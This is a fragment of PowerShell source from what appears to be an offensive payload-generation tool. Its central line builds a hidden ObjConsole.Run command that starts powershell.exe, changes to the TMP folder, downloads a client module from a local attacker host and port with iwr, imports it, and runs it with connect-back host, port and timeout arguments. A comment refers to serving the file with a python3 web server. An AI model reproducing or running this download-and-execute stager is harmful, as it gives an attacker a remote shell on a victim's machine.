...
If($Encode -ieq "True" -and $Action -ieq "obfuscate")
{
   ...
   write-host " error: Encode param requires -action 'rawcat'" -ForegroundColor Blue
   Start-Sleep -Milliseconds 600
}
...
ObjConsole.Run(`"powershell.exe cd `$Env:TMP;iwr -Uri http://${Local_Host}:${serverPort}/$ClientName -OutFile $ClientName;Import-Module -Name .\$ClientName -Force;$ClientRawn -c $Local_Host -e $Execute -p $PayloadPort -t $timeout`"), 0
}")
...
If($Python_version)
{
   ...
   #Start python3 http.server webserver
